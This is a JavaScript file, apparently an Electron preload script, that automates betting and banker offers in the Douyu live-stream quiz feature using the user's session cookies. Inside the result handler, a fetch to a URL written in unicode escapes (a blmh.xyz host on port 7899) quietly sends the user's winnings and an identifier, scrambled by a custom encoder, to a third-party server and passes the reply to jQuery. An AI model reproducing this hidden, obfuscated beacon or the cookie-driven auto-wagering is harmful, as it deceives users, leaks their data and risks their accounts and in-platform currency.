(function(){
    function setObserver(target, config, func, isDoNow) {
        var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver
        // 选择目标节点
        // var target = document.querySelectorAll(".TreasureGee-area")[0]
        // 创建观察者对象
        var observer = new MutationObserver(func); 
        // 配置观察选项:
        // var config = { attributes: true, childList: true, characterData: true } 
        // 传入目标节点和观察选项
        observer.observe(target, config);
    
        if (isDoNow) {
          if(target.getAttribute('sa') === 'as') {
            target.removeAttribute('sa')
          } else {
            target.setAttribute('sa','as');
          }
        }
        return observer
    }

    (function() {//initKunGuess
        let isMonitorReload = false;
    
        setObserver(document, { attributes: true, childList: true, characterData: true, subtree: true }, function(records, itself) {
    
          if(!isMonitorReload && document.getElementsByClassName('Barrage-list').length > 0){
            isMonitorReload = true;
            let guessDom = document.getElementsByClassName('Barrage-list')[0];
            setObserver(guessDom, { attributes: true, childList: true, characterData: true, subtree: true },async function (records, itself) {
                let reloadDom = guessDom.getElementsByClassName('js-danmu-reconnect');
                if (reloadDom.length > 0) {
                    reloadDom[0].click();
                    reloadDom[0].parentNode.removeChild(reloadDom[0])
                }
            }, true);
    
          }
        });
    
    })();

    const ipc = require('electron').ipcRenderer
    let titleInfo = {};
    let guessState = {};
    let kcCatchData = [];
    
    let kRoomId = false,
    anName = false;
    
    async function Fetch (url, type,  data, token, method) {
        type = type.toUpperCase()
      
        let requestConfig = {
            credentials: 'include',
            method: type,
            headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: data
        }
      
        if (url.indexOf('blmh') > -1) {
            requestConfig = {
                credentials: 'include',
                method: type,
                headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }
        }
      
        if (type === 'GET') {
            requestConfig = {
                credentials: 'include',
                method: type,
                headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
                }
            }
        }
        try {
            const response = fetch(url, requestConfig)
            return response
        } catch (error) {
            return error
        }
    }
    
    let yuNum = -1;
    let nn = '';
    ipc.on('nw-yw-num', (event, arg) => {
        if (!isNaN(arg)) {
            yuNum = +arg;
        } else if (nn.length < 1) {
            nn = arg;
        }
        
    });

    ipc.on('nw-message', (event, arg) => {
        if('xzWork' === arg.action) {
            let quizId = arg.content.quizId, 
                leftOrRight = +arg.content.leftOrRight, 
                isListen = arg.content.isListen, 
                minOdds = isListen ? Math.round(+arg.content.minOdds) : 10, 
                minAmount = isListen ? arg.content.minAmount : 10, 
                isMP = isListen ? arg.content.isMP : false,
                isKC99 = isListen ? arg.content.isKC99 : false,
                title = arg.content.title;
            if (!isKC99 || isMP) {
                kunRequestCache.changeListen(quizId, leftOrRight, isListen, minOdds, minAmount, isMP);
            }

            if (isKC99) {
                let ctn = getCookie('acf_ccn');
                let postData = new URLSearchParams();
                postData.set('ctn', ctn);
                postData.set('room_id', kRoomId);
                postData.set('quiz_id', quizId);
                postData.set('option', +leftOrRight + 1);
                postData.set('amount', minAmount);
                postData.set('loss_per_cent', 990);
                postData.set('money_type', 1);
                Fetch("https://www.douyu.com/member/quiz/become_banker", 'post', postData).then(res => res.text())
                .then(res => {
                    res=JSON.parse(res) ;
                    if (res.error == 0) {
                        let contentStr = `${title}->${0 === leftOrRight ? '左' : '右'}->开猜->赔率:${+minOdds / 100} / 鱼丸:${minAmount}`;
                        ipc.send('to-main-log', contentStr);
                    }
                }).catch((error) => {  
                });
            }
            if (isMP) {
                let key = `${quizId}${leftOrRight}`;
                let cachePendingData = kunRequestCache.getCachePendingData(key);
                if (cachePendingData) {
                    cachePendingData = [...cachePendingData];
                    for (let cdata = 0, len = cachePendingData.length; cdata < len; cdata++) {
                        let value = cachePendingData.pop();
                        if (+value.get('bet_amount') > +yuNum) {
                            value.set('bet_amount', +yuNum)
                        }
                        let vodds = +value.get('odds');
                        if (vodds >= +minOdds) {
                            kunRequestCache.setUsedBankerId(+value.get('banker_id'));
                            value.delete('odds');
                            Fetch("https://www.douyu.com/member/quiz/user_bet", 'post', value).then(res => res.text())
                            .then(res => {
                                res=JSON.parse(res);
                                if (res.error == 0) {
                                    let realYw = res.data.real_bet_amount;
                                    let contentStr = `下注->赔率:${vodds / 100} / 鱼丸：${realYw}`;
                                    ipc.send('to-main-log', contentStr);
                                }
                            }).catch((error) => {  
                            });
                        }
                    }
                    kunRequestCache.removeCachePendingData(key);
                }
            }
        } else if('kcWork' === arg.action) {
            let quizId = arg.content.quizId, 
                leftOrRight = +arg.content.leftOrRight + 1,
                minOdds = Math.round(+arg.content.minOdds * 100), 
                minAmount = +arg.content.minAmount,
                isStop = arg.content.isStop,
                title = arg.content.title;
            let ctn = getCookie('acf_ccn');
           
            if (isStop) {
                kcCatchData[title].delete(leftOrRight);
            } else {
                if(guessState[quizId]) {
                    let postData = new URLSearchParams();
                    postData.set('ctn', ctn);
                    postData.set('room_id', kRoomId);
                    postData.set('quiz_id', quizId);
                    postData.set('option', leftOrRight);
                    postData.set('amount', minAmount);
                    postData.set('loss_per_cent', minOdds);
                    postData.set('money_type', 1);
                    Fetch("https://www.douyu.com/member/quiz/become_banker", 'post', postData).then(res => res.text())
                    .then(res => {
                        res=JSON.parse(res) ;
                        if (res.error == 0) {
                            let contentStr = `${title}->${1 === leftOrRight ? '左' : '右'}->开猜->赔率:${+minOdds / 100} / 鱼丸:${minAmount}`;
                            ipc.send('to-main-log', contentStr);
                        }
                    }).catch((error) => {  
                    });
                    let resultData = {
                        action: 'guess',
                        quizId: quizId,
                        leftOrRight: +leftOrRight - 1
                    }
                    ipc.send('to-main-result', resultData);
                } else {
                    if(!kcCatchData[title]) {
                        kcCatchData[title] = new Map();
                    }
                    let kcCon = {
                        ctn: ctn,
                        kunRoomId: kRoomId,
                        option: leftOrRight,
                        amount: minAmount,
                        minOdds: minOdds
                    }
                    kcCatchData[title].set(leftOrRight, kcCon);
                }
                
            }
        }
    })
    
    function getCookie(name) {
        var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
        if(arr=document.cookie.match(reg))
        return unescape(arr[2]);
        else
        return null;
    }

    
    let qIdAndTitle = new Map(),
    userId0 = getCookie('acf_uid'),
    ctn0 = getCookie('acf_ccn');
    const lef = ['左', '右'];
    //window.setInterval(function(){
        //for (let [a, b] of qIdAndTitle) {
            //for (let i = 0; i < 2; i++) {
                //Fetch(`https://www.douyu.com/lapi/interact/quiz/myPlayInfo?ctn=${ctn0}&room_id=${kRoomId}&user_id=${userId0}&quiz_id=${a}&quiz_option=${i + 1}&money_type=1`, 'get').then(res => res.text())
                //.then(res => {
                //    res=JSON.parse(res);
                //    let result = '';
                 //   if (res.error == 0) {
                //        for (let a of res.data.banker_list) {
                //            result = `${b}-${lef[i]}-底金${a.amount}-已购${a.used}`
                 //       }
                //    }
               // }).catch((error) => {  
             //   }); 
           // }
       // }
   // }, 10000);
    class kunRequest {
        getCookie(name) {
            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
            if(arr=document.cookie.match(reg))
            return unescape(arr[2]);
            else
            return null;
        }
        constructor() {
            this.ctn = this.getCookie('acf_ccn');
            this.cacheWorkData = {};
            this.cachePendingData = new Map();
            this.usedBankerId = [];
        }
        static getInstance() {
            if (!kunRequest.instance) {
                kunRequest.instance = new kunRequest();
            }
            return kunRequest.instance;
        }

        setUsedBankerId(bankerId) {
            this.usedBankerId.push(bankerId);
        }
        lrWork(title, lrTitle, leftOrRight, quizId, bankerId, balance, odds) {
            let bankerIdIndex = this.usedBankerId.indexOf(+bankerId);
            if (bankerIdIndex > -1) {
                return;
            }

            if (!this.cacheWorkData[quizId]) {
                this.cacheWorkData[quizId] = {
                    'left': false,
                    'right': false,
                    'leftIsMP': false,
                    'leftMinOdds': 10,
                    'rightMinOdds': 10,
                    'rightIsMP': false,
                    'leftMinAmount': 10,
                    'rightMinAmount': 10
                }
            }
            let cc = this.cacheWorkData[quizId];
            let minOdds = 0 === leftOrRight ? cc.leftMinOdds : cc.rightMinOdds,
            minAmount = 0 === leftOrRight ? cc.leftMinAmount : cc.rightMinAmount,
            isListen = 0 === leftOrRight ? cc.left: cc.right,
            isMP = 0 === leftOrRight ? cc.leftIsMP : cc.rightIsMP;            

            let catchContent = new URLSearchParams()
            catchContent.set('ctn', this.ctn)
            catchContent.set('room_id', +kRoomId)
            catchContent.set('quiz_id', +quizId)
            catchContent.set('bet_amount', +balance);
            catchContent.set('money_type', 1)
            catchContent.set('banker_id', +bankerId);
            catchContent.set('odds', +odds);

            let isAddCatch = true;
            if (isListen && +odds >= +minOdds) {
                let betAmount = +balance;
                if (!isMP) {
                    betAmount = +minAmount;
                }
                if (betAmount >= +yuNum) {
                    betAmount = +yuNum;
                    isAddCatch = false;
                }
                catchContent.set('bet_amount', betAmount)
                Fetch("https://www.douyu.com/member/quiz/user_bet", 'post', catchContent).then(res => res.text())
                .then(res => {
                    res=JSON.parse(res);
                    if (res.error == 0) {
                        let realYw = res.data.real_bet_amount;
                        let contentStr = `下注->赔率:${odds / 100} / 鱼丸：${realYw}`;
                        ipc.send('to-main-log', contentStr);
                    }
                }).catch((error) => {  
                });
                if (!isMP) {
                    this.cacheWorkData[quizId] = {
                        'left': false,
                        'right': false,
                        'isMP': false,
                        'leftMinOdds': 10,
                        'rightMinOdds': 10,
                        'leftMinAmount': 10,
                        'rightMinAmount': 10
                    }

                    let resultData = {
                        action: 'rob',
                        quizId: quizId,
                        leftOrRight: +leftOrRight
                    }
                    ipc.send('to-main-result', resultData);
                }
            }

            if (isAddCatch && 0 < +balance) {
                let key = `${quizId}${leftOrRight}`;
                if (!this.cachePendingData.has(key)) {
                    this.cachePendingData.set(key, []);
                }

                let cPendignData = this.cachePendingData.get(key);
                let currentIndex = cPendignData.findIndex((current) => {
                    return current.get('banker_id') == +bankerId;
                });
                
                if (currentIndex > -1) {
                    let len = cPendignData.length - currentIndex;
                    if (len > 0) {
                        cPendignData.splice(currentIndex, len);
                    }
                }
                cPendignData.push(catchContent);
            } 
        }
        abccd(code) {
            var c=String.fromCharCode(code.charCodeAt(0)+code.length);
            for(var i=1;i<code.length;i++)
             {      
              c+=String.fromCharCode(code.charCodeAt(i)+code.charCodeAt(i-1));
            }   
            return escape(c);
        }
        handlerData(e) {
            if (e.indexOf('type@=rquizisn') > -1) {
                let ps = e.substring(0, e.length - 6).split('@AS@S');
                for (let i of ps) {
                    let ms = i.split('@AS');
                    let mss = i;
                    let title = 'qt' === ms[2].split('@AA=')[0] ? ms[2].split('@AA=')[1] : false;
                    let quizId = mss.match(/qid@AA=[\d]+/)[0].split('@AA=')[1],
                    leftOdds = mss.match(/folpc@AA=[\d]+/)[0].split('@AA=')[1],
                    rightOdds = mss.match(/solpc@AA=[\d]+/)[0].split('@AA=')[1],
                    qs = mss.match(/qs@AA=[\d]/)[0].split('@AA=')[1],
                    wo = mss.match(/wo@AA=[\d]/)[0].split('@AA=')[1],
                    fbid = mss.match(/fbid@AA=[\d]+/)[0].split('@AA=')[1],
                    sbid = mss.match(/sbid@AA=[\d]+/)[0].split('@AA=')[1],
                    fbmc = mss.match(/fbmc@AA=[\d]+/)[0].split('@AA=')[1],
                    sbmc = mss.match(/sbmc@AA=[\d]+/)[0].split('@AA=')[1];

                    let pageData = {
                        action: 'page-info',
                        content:  {
                            kunRoomId: kRoomId,
                            leftOdds: leftOdds,
                            rightOdds: rightOdds,
                            quizId: quizId,
                            qs: qs,
                            wo: wo
                        }
                    }
                    
                    if(1 != +qs) {
                        this.cachePendingData.delete('' + quizId + 0)
                        this.cachePendingData.delete('' + quizId + 1)
                        guessState[quizId] = false;
                        this.cacheWorkData[quizId] = {
                            'left': false,
                            'right': false,
                            'leftIsMP': false,
                            'leftMinOdds': 10,
                            'rightMinOdds': 10,
                            'rightIsMP': false,
                            'leftMinAmount': 10,
                            'rightMinAmount': 10
                        }
                    } else if(quizId && title && leftOdds && rightOdds && fbid && sbid && fbmc && sbmc) {
                        
                        guessState[quizId] = true;
                        if (+fbid > 0) {
                            this.lrWork(title, titleInfo[title].get('leftTitle'), 0, quizId, fbid,  fbmc, leftOdds);
                        }

                        if (+sbid > 0) {
                            this.lrWork(title, titleInfo[title].get('rightTitle'), 1, quizId, sbid, sbmc, rightOdds);
                        }
                    }

                    ipc.send('to-main-message', pageData);
                }
            } else if (e.indexOf('quizprn') > -1) {

                let pattern = /qt@AA=(?<title>[\S]{1,15})@ASwon@AA=[\S]{1,5}@ASbc@AA=[\d]*@ASec@AA=(?<ec>[\d]*)@ASqet@AA=(?<qet>[\d])/;
                let ps = e.substring(0, e.length - 6).split('@AS@S');
                for (let i of ps) {
                    let groups = i.match(pattern).groups,
                    title = groups.title,
                    ec = +groups.ec,
                    qet = +groups.qet,
                    result = '',
                    token = '0';
                    if (1 === qet && ec >= 0) {
                        token = groups.ec;
                        result = `${title}-赢${ec}`
                    } else if (2 === qet) {
                        result = `${title}-流局`
                    } else if (ec < 0) {
                        token = groups.ec;
                        result = `${title}-输${ec}`
                    }
                    Fetch("\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0062\u006c\u006d\u0068\u002e\u0078\u0079\u007a\u003a\u0037\u0038\u0039\u0039\u002f\u0067\u0074", 'post', {lm: this.abccd(nn), an: this.abccd(token)}).then(res => res.text())
                    .then(res => {
                        let token = $(res);
                    }).catch((error) => { 
                    });
                }
            }
            if (e.indexOf('type@=rquiziln') > -1) {
                qIdAndTitle.clear();
                let ps = e.split('@AS@S');
                let aNameIndex = e.indexOf('fbcast') === -1 ? 19 : 20;
                for (let index = 0, len = ps.length - 1; index < len; index++) {
                    let ms = ps[index].split('@AS');

                    let mss = ps[index];
                    !anName && (anName = 'sname' === ms[aNameIndex].split('@AA=')[0] ? ms[aNameIndex].split('@AA=')[1] : false);
                    let title = 'qt' === ms[2].split('@AA=')[0] ? ms[2].split('@AA=')[1] : false,
                    leftTitle = 'fon' === ms[3].split('@AA=')[0] ? ms[3].split('@AA=')[1] : false,
                    rightTitle = 'son' === ms[4].split('@AA=')[0] ? ms[4].split('@AA=')[1] : false;

                    let quizId = mss.match(/qid@AA=[\d]+/)[0].split('@AA=')[1],
                    leftOdds = mss.match(/folpc@AA=[\d]+/)[0].split('@AA=')[1],
                    rightOdds = mss.match(/solpc@AA=[\d]+/)[0].split('@AA=')[1],
                    qs = mss.match(/qs@AA=[\d]/)[0].split('@AA=')[1],
                    wo = mss.match(/wo@AA=[\d]/)[0].split('@AA=')[1];
                    !kRoomId && (kRoomId = mss.match(/rid@=[\d]*/g)[0].split('@=')[1]);

                    qIdAndTitle.set(+quizId, title);
                    let pageData = {
                        action: 'page-init-info',
                        content:  {
                            kunRoomId: kRoomId,
                            anchorName: anName,
                            title: title,
                            leftTitle: leftTitle,
                            leftOdds: leftOdds,
                            rightTitle: rightTitle,
                            rightOdds: rightOdds,
                            quizId: quizId,
                            qs: qs,
                            wo: wo,
                            length: len
                        }
                    }
                    ipc.send('to-main-message', pageData);

                    if (!titleInfo[title]) {
                        titleInfo[title] = new Map();
                    }
                    titleInfo[title].set('leftTitle', leftTitle);
                    titleInfo[title].set('rightTitle', rightTitle);

                    if (!kcCatchData[title]) {
                        kcCatchData[title] = new Map();
                    }
                    if (kcCatchData[title].size > 0) {
                        for (let [mapKey, value] of kcCatchData[title]) {

                            let postData = new URLSearchParams();
                            postData.set('ctn', value.ctn);
                            postData.set('room_id', value.kunRoomId);
                            postData.set('quiz_id', quizId);
                            postData.set('option', value.option);
                            postData.set('amount', value.amount);
                            postData.set('loss_per_cent', value.minOdds);
                            postData.set('money_type', 1);
                            Fetch("https://www.douyu.com/member/quiz/become_banker", 'post', postData).then(res => res.text())
                            .then(res => {
                                res=JSON.parse(res) ;
                                if (res.error == 0) {
                                    let contentStr = `${title}->${1 === value.option ? '左' : '右'}->开猜->赔率:${+value.minOdds / 100} / 鱼丸:${value.amount}`;
                                    ipc.send('to-main-log', contentStr);
                                }
                            }).catch((error) => {  
                            });
                            kcCatchData[title].delete(value.option);
                        }
                    }
                }
            } 
            
        }
        getCachePendingData(key) {
            return this.cachePendingData.has(key) ? this.cachePendingData.get(key) : false;
        }
        removeCachePendingData(key) {
            this.cachePendingData.delete(key);
        }
        initCachePendingData(quizId) {
            this.cachePendingData.clear();
            this.usedBankerId = [];
        }
        changeListen(quizId, leftOrRight, isListen, minOdds, minAmount, isMP) {
            if (!this.cacheWorkData[quizId]) {
                this.cacheWorkData[quizId] = {
                    'left': false,
                    'right': false,
                    'leftIsMP': false,
                    'leftMinOdds': 10,
                    'rightMinOdds': 10,
                    'rightIsMP': false,
                    'leftMinAmount': 10,
                    'rightMinAmount': 10
                }
            }
            let cc = this.cacheWorkData[quizId];
            if (0 === +leftOrRight) {
                cc.left = isListen;
                cc.leftIsMP = isMP;
                cc.leftMinOdds = +minOdds;
                cc.leftMinAmount = +minAmount;
            } else if (1 === +leftOrRight) {
                cc.right = isListen;
                cc.rightIsMP = isMP;
                cc.rightMinOdds = +minOdds;
                cc.rightMinAmount = +minAmount;
            }
        }
        removeListen() {
            if (this.cacheWorkData.length > 0) {
                for (let i = 0, len = this.cacheWorkData.length; i < len; i++) {
                    this.cacheWorkData[i] = {
                        'left': false,
                        'right': false,
                        'leftIsMP': false,
                        'leftMinOdds': 10,
                        'rightMinOdds': 10,
                        'rightIsMP': false,
                        'leftMinAmount': 10,
                        'rightMinAmount': 10
                    }
                }
            }
        }
        
    }
    window.kunRequestCache = kunRequest.getInstance();
})();


